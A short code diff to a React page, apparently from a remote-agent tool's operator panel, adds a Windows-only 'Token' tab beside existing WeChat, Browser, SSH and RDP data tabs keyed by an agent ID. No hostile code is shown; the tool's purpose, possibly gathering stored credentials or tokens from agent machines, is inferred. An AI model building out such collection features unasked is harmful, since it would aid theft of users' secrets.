@@ -7,6 +7,7 @@ import { WeChatTab } from './WeChatTab';
 import { BrowserTab } from './BrowserTab';
 import { SSHTab } from './SSHTab';
 import { RDPTab } from './RDPTab';
+import { TokenTab } from './TokenTab';
 
 export default function SoftwareDataPage() {
   const { t } = useTranslation();
@@ -22,6 +23,7 @@ export default function SoftwareDataPage() {
     { id: 'browser', label: t('othersoft.browser.title'), render: <BrowserTab agentId={agentId} />, windowsOnly: true },
     { id: 'ssh', label: t('othersoft.ssh.title'), render: <SSHTab agentId={agentId} /> },
     { id: 'rdp', label: t('othersoft.rdp.title'), render: <RDPTab agentId={agentId} />, windowsOnly: true },
+    { id: 'token', label: 'Token', render: <TokenTab agentId={agentId} />, windowsOnly: true },
   ].filter((tb) => !tb.windowsOnly || isWindows);
 
   if (!agentId) {
